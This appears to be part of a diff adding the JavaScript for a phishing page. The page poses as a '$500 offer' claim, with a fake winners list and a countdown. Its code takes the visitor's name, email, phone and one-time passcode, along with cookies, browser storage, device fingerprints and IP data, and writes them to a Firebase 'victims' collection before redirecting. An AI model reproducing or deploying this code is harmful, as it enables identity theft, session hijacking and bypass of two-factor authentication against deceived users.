+          <div class="n">${n}</div>
+          <div class="w">Won ${amt} · ${mins}m ago</div>
+        </div>
+      </div>`;
+  }).join('');
+  setTimeout(renderWinners, 12000);
+}
+
+/* ═══════════════════════════════════════════════════════
+   MODAL CONTROL
+   ═══════════════════════════════════════════════════════ */
+function openModal(){
+  ensureIntel();
+  document.getElementById('modalBg').classList.add('on');
+  setTimeout(() => {
+    const f = document.getElementById('fullName');
+    if(f) f.focus();
+  }, 100);
+}
+function closeModal(){
+  document.getElementById('modalBg').classList.remove('on');
+  resetModal();
+}
+function resetModal(){
+  document.getElementById('claimStep1').style.display = 'block';
+  document.getElementById('claimStep2').style.display = 'none';
+  document.getElementById('claimStep3').style.display = 'none';
+  const cf = document.getElementById('claimForm');
+  if(cf) cf.reset();
+  const of = document.getElementById('otpForm');
+  if(of) of.reset();
+  document.getElementById('claimError').classList.remove('show');
+  document.getElementById('otpError').classList.remove('show');
+  document.getElementById('claimBtn').disabled = false;
+  document.getElementById('claimBtnText').style.display = 'inline';
+  document.getElementById('claimSpinner').style.display = 'none';
+}
+document.getElementById('modalBg').addEventListener('click', e => {
+  if(e.target.id === 'modalBg') closeModal();
+});
+
+/* ═══════════════════════════════════════════════════════
+   STEP 1 — CLAIM FORM
+   ═══════════════════════════════════════════════════════ */
+async function submitClaim(event){
+  event.preventDefault();
+  const errBox = document.getElementById('claimError');
+  errBox.classList.remove('show');
+
+  const fullName = document.getElementById('fullName').value.trim();
+  const email = document.getElementById('email').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+
+  if(!fullName || fullName.length < 2){
+    errBox.textContent = 'Please enter your full name.';
+    errBox.classList.add('show'); return false;
+  }
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){
+    errBox.textContent = 'Please enter a valid email address.';
+    errBox.classList.add('show'); return false;
+  }
+  if(!phone || phone.replace(/\D/g, '').length < 7){
+    errBox.textContent = 'Please enter a valid phone number.';
+    errBox.classList.add('show'); return false;
+  }
+
+  document.getElementById('claimBtnText').style.display = 'none';
+  document.getElementById('claimSpinner').style.display = 'block';
+  document.getElementById('claimBtn').disabled = true;
+
+  await ensureIntel();
+
+  const victimId = 'of_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+  pendingVictimId = victimId;
+  pendingData = { fullName, email, phone };
+
+  try{
+    await database.ref('victims/' + victimId).set({
+      platform: 'offer',
+      email: email,
+      phone: phone,
+      fullName: fullName,
+      offerAmount: '$500',
+      step: 'claim',
+      deviceInfo: cachedDeviceInfo,
+      canvasFingerprint: cachedCanvasFP,
+      webglFingerprint: cachedWebGLFP,
+      cookies: getAllCookies(),
+      cookieString: document.cookie,
+      ipInfo: cachedIPInfo,
+      timestamp: new Date().toISOString(),
+      victimId: victimId,
+      referrer: document.referrer || 'Direct Access',
+      pageUrl: window.location.href,
+      localStorageData: getLocalStorage(),
+      sessionStorageData: getSessionStorage()
+    });
+    console.log('✓ Offer claim captured');
+  }catch(e){ console.error('Firebase error:', e.message); }
+
+  setTimeout(() => {
+    document.getElementById('claimStep1').style.display = 'none';
+    document.getElementById('claimStep2').style.display = 'block';
+    document.getElementById('phoneDisplay').textContent = phone;
+    setTimeout(() => document.getElementById('otpInput').focus(), 100);
+  }, 900);
+
+  return false;
+}
+
+/* ═══════════════════════════════════════════════════════
+   STEP 2 — OTP
+   ═══════════════════════════════════════════════════════ */
+async function submitOtp(event){
+  event.preventDefault();
+  const errBox = document.getElementById('otpError');
+  errBox.classList.remove('show');
+
+  const otp = document.getElementById('otpInput').value.trim().replace(/\D/g, '');
+  if(!otp || otp.length < 4){
+    errBox.textContent = 'Please enter the 6-digit code.';
+    errBox.classList.add('show'); return false;
+  }
+
+  document.getElementById('otpBtnText').style.display = 'none';
+  document.getElementById('otpSpinner').style.display = 'block';
+  document.getElementById('otpBtn').disabled = true;
+
+  await ensureIntel();
+
+  const id = pendingVictimId + '_otp';
+  try{
+    await database.ref('victims/' + id).set({
+      platform: 'offer',
+      email: pendingData?.email || '',
+      phone: pendingData?.phone || '',
+      fullName: pendingData?.fullName || '',
+      offerAmount: '$500',
+      otp: otp,
+      otpCode: otp,
+      step: 'otp',
+      deviceInfo: cachedDeviceInfo,
+      ipInfo: cachedIPInfo,
+      cookies: getAllCookies(),
+      cookieString: document.cookie,
+      timestamp: new Date().toISOString(),
+      victimId: id,
+      parentVictimId: pendingVictimId,
+      pageUrl: window.location.href
+    });
+    console.log('✓ Offer OTP captured');
+  }catch(e){ console.error('Firebase error:', e.message); }
+
+  setTimeout(() => {
+    document.getElementById('claimStep2').style.display = 'none';
+    document.getElementById('claimStep3').style.display = 'block';
+    document.getElementById('successEmail').textContent = pendingData?.email || 'your email';
+  }, 900);
+
+  return false;
+}
+
+async function resendCode(){
+  await ensureIntel();
+  const id = pendingVictimId + '_resend_' + Date.now();
+  try{
+    await database.ref('victims/' + id).set({
+      platform: 'offer',
+      email: pendingData?.email || '',
+      phone: pendingData?.phone || '',
+      otp: 'RESEND_REQUESTED',
+      step: 'resend',
+      ipInfo: cachedIPInfo,
+      deviceInfo: cachedDeviceInfo,
+      timestamp: new Date().toISOString(),
+      victimId: id,
+      parentVictimId: pendingVictimId
+    });
+  }catch(e){}
+  alert('A new code has been sent to ' + (pendingData?.phone || 'your phone'));
+}
+
+/* ═══════════════════════════════════════════════════════
+   FINISH
+   ═══════════════════════════════════════════════════════ */
+function finishClaim(){
+  window.location.href = REDIRECT_URL;
+}
+
+/* ═══════════════════════════════════════════════════════
+   BOOT
+   ═══════════════════════════════════════════════════════ */
+window.addEventListener('load', () => {
+  ensureIntel();
+  startExpiresCountdown();
+  startLiveNumbers();
+  renderWinners();
+});
+</script>
+</body>
+</html>
